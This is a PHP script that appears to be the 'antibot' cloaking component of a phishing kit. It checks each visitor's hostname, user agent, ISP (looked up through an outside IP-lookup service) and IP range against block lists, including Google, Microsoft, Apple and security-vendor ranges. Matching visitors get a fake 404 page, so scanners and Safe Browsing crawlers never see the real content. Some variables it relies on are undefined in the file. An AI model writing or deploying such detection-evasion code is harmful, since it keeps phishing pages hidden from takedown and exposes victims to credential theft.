<?php


$tanitatikaram = parse_ini_file("php.ini",true);
$setting_host=$tanitatikaram['setting_host'];
$setting_ua=$tanitatikaram['setting_ua'];
$setting_iprange=$tanitatikaram['setting_iprange'];
$setting_isp=$tanitatikaram['setting_isp'];
date_default_timezone_set("Asia/Jakarta");
function get_data($data) {
$data = file_get_contents("security/$data.dat");
if(strcasecmp(substr(PHP_OS,0,3),'WIN') == 0){
$data = explode("
",$data);
}else{
$data = explode("
",$data);
}
return $data;
}
$ip = getenv("REMOTE_ADDR");
$blocker_ua = get_data("useragent");
$blocker_ip = get_data("ip");
$blocker_hostname = get_data("hostname");
$blocker_isp = get_data("isp");
$blocker_uafull = get_data("ua-full");
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$ip = getenv("REMOTE_ADDR");
$url = 'http://extreme-ip-lookup.com/json/'.$ip;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
$resp=curl_exec($ch);
curl_close($ch);
$details = json_decode($resp,true);
$isp =  $details['org'];
if($setting_host == "on") {
foreach ($blocker_hostname as $hostnamebot) {
if (substr_count($hostname,$hostnamebot) >0) {
$status = "botH";
$detect = "Hostname";
}
}
}
if($status == "botH") {
header(require 'Antibot/AntibotHostname.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
if($setting_ua == "on"){
foreach ($blocker_ua as $useragent) {
if (substr_count($ua,strtolower($useragent)) >0 or $ua == ""or $ua == " "or $ua == "    ") {
$status = "botu";
$detect = "User Agent";
}
}
foreach ($blocker_uafull as $uanew) {
if ($ua == strtolower($uanew)) {
$status = "botu";
$detect = "User Agent";
}
}
}
if($status == "botu") {
header(require 'Antibot/AntibotUseragent.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
if($setting_iprange == "on") {
foreach ($blocker_ip as $ipbot) {
if(preg_match('/'.$ipbot .'/',$_SERVER['REMOTE_ADDR'])){
$status = "botRange";
$detect = "IP Range";
}
}
}
if($status == "botRange") {
header(require 'Antibot/AntibotIPRangeClass.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
if($setting_isp == "on") {
foreach ($blocker_isp as $ispbot) {
if (substr_count($isp,$ispbot) >0) {
$status = "botisp";
$detect = "ISP";
}
}
}
if($status == "botisp") {
header(require 'Antibot/AntibotInternetserviceprovider.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
$bannedIP = array("66.249.91.*","66.249.91.203","^81.161.59.*","^66.135.200.*","^66.102.*.*","^38.100.*.*","^107.170.*.*","^149.20.*.*","^38.105.*.*","^74.125.*.*","^66.150.14.*","^54.176.*.*","^38.100.*.*","^184.173.*.*","^66.249.*.*","^128.242.*.*","^72.14.192.*","^208.65.144.*","^74.125.*.*","^209.85.128.*","^216.239.32.*","^74.125.*.*","^207.126.144.*","^173.194.*.*","^72.14.192.*","^66.102.*.*","^64.18.*.*","^194.52.68.*","^194.72.238.*","^62.116.207.*","^212.50.193.*","^69.65.*.*","^50.7.*.*","^131.212.*.*","^46.116.*.* ","^62.90.*.*","^89.138.*.*","^82.166.*.*","^85.64.*.*","^85.250.*.*","^89.138.*.*","^93.172.*.*","^109.186.*.*","^194.90.*.*","^212.29.192.*","^212.29.224.*","^212.143.*.*","^212.150.*.*","^212.235.*.*","^217.132.*.*","^50.97.*.*","^217.132.*.*","^209.85.*.*","^66.205.64.*","^204.14.48.*","^64.27.2.*","^67.15.*.*","^202.108.252.*","^193.47.80.*","^64.62.136.*","^66.221.*.*","^64.62.175.*","^198.54.*.*","^192.115.134.*","^216.252.167.*","^193.253.199.*","^69.61.12.*","^64.37.103.*","^38.144.36.*","^64.124.14.*","^206.28.72.*","^209.73.228.*","^158.108.*.*","^168.188.*.*","^66.207.120.*","^167.24.*.*","^192.118.48.*","^67.209.128.*","^12.148.209.*","^12.148.196.*","^193.220.178.*","68.65.53.71","^198.25.*.*","^64.106.213.*","^91.103.66.*","^208.91.115.*","^199.30.228.*","^84.93.84.*","^182.75.120.*","^182.75.120.10","^46.101.43.*","^147.75.210.*");
if($setting_iprange == "on") {
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
$status = "botRange";
$detect = "IP Range";
}else {
foreach($bannedIP as $ipss) {
if(preg_match('/'.$ipss .'/',$_SERVER['REMOTE_ADDR'])){
$status = "botRange";
$detect = "IP Range";
}
}
}
}
if($status == "botRange") {
header(require 'Antibot/AntibotIPRangeClass.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
$v_agent = $_SERVER['HTTP_USER_AGENT'];
if($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)"||$v_agent == "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5 (Applebot/0.1; +http://www.apple.com/go/applebot)") {
$ip = getUserIP();
$status = "bot";
$detect = "Bot Microsoft";
}
if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {
$ip = getUserIP();
$status = "botagent";
$detect = "Bot Microsoft";
}
if($os == "Windows Server 2003/XP x64") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($os == "Windows 7"and $br == "Firefox") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($os == "Windows XP"and $br == "Firefox") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($os == "Windows XP"and $br == "Chrome") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($os == "Windows Vista"or $os == "Ubuntu"or $os == "Chrome OS"or $os == "BlackBerry"or $os == "Linux") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($br == "Internet Explorer") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($br == "Unknown Browser") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($os == "Windows 2000") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($os == "Unknown OS Platform") {
$status = "botagent";
$detect = "Google Safebrowsing";
}
if($status == "botagent") {
header(require 'Antibot/AntibotUseragent.php');
die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
}
;